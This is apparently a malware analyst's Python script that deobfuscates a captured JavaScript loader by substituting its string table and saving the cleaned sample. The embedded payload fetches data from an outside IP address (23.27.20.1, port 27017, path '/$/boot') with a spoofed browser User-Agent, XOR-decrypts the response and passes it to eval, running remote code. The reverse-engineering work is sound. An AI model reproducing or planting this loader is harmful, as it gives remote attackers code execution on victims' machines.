data = r"""(function() {
    _global = global;
    _global['_H'] = GETDEVALUE(0x1a0) + (GETDEVALUE(0x1a6) + '43') + ':' + 0x6989, ((async () => {
        await eval(function(a) {
            const b = GETDEVALUE(0x196) + GETDEVALUE(0x19f),
                d = b[GETDEVALUE(0x1aa)];
            let e = '';
            for (let f = 0x0; f < a[GETDEVALUE(0x1aa)]; f++) {
                const g = a['charCodeAt'](f),
                    h = b[GETDEVALUE(0x19e)](f % d);
                e += _global[GETDEVALUE(0x1a4)][GETDEVALUE(0x19c) + 'de'](g ^ h)
            };
            return e
        }(await new _global['Promise']((c, d) => {
            const e = new _global[(GETDEVALUE(0x1ad))](_global['_H'] + GETDEVALUE(0x1ab)),
                f = {};
            f[GETDEVALUE(0x1a2)] = GETDEVALUE(0x1a7) + '0 (Windows' + ' NT 10.0; ' + 'Win64; x64' + GETDEVALUE(0x1b0) + GETDEVALUE(0x1a3) + GETDEVALUE(0x199) + 'ike Gecko)' + ' Chrome/13' + '1.0.0.0 Sa' + GETDEVALUE(0x198) + '6', f[GETDEVALUE(0x1ae)] = _global['_V'] || 0x0;
            const g = {};
            g[GETDEVALUE(0x1ac)] = GETDEVALUE(0x1a8), g[GETDEVALUE(0x1b4)] = e[GETDEVALUE(0x1b4)], g[GETDEVALUE(0x1af)] = e[GETDEVALUE(0x1af)], g[GETDEVALUE(0x1b5)] = e[GETDEVALUE(0x1a5)], g[GETDEVALUE(0x19d)] = f;
            const h = g,
                i = _global['r'](GETDEVALUE(0x19b))[GETDEVALUE(0x191)](h, (j) => {
                    let k = '';
                    j['on'](GETDEVALUE(0x197), (l) => {
                        k += l
                    }), j['on'](GETDEVALUE(0x1a9), () => {
                        c(k)
                    })
                });
            i['on'](GETDEVALUE(0x195), (j) => {
                d(j)
            }), i['end']()
        })))
    })());
})()"""

ids = [
  '1671173XXMevk', 'request',        '4BAOYpu',
  '40RuBbtK',      '299083dRpJMk',   'error',
  'ThZG+0jfXE',    'data',           'fari/537.3',
  ' (KHTML; l',    '30040164YJevyk', 'http',
  'fromCharCo',    'headers',        'charCodeAt',
  '6VAGOJ',        'http://',        '1572213IoJgqP',
  'User-Agent',    'Kit/537.36',     'String',
  'pathname',      '23.27.20.1',     'Mozilla/5.',
  'GET',           'end',            'length',
  '/$/boot',       'method',         'URL',
  'Sec-V',         'port',           ') AppleWeb',
  '4672578DTVrVD', '2496998ZbRjRJ',  '7374605eWzmiq',
  'hostname',      'path'
]

for i in range(len(ids)):
    old = f"GETDEVALUE(0x{i+0x190:x})"
    new = f"'{ids[i]}'"
    print("replacing:" + old)
    data = data.replace(old, new)

with open('payload2_bsc_0x13e3ce3aefc019258c618265241ec1c51d858e6e5457a48ea5e38820fc4ba9a1_deobfu_beautified.malware_sample', 'wt') as f:
    f.write(data)
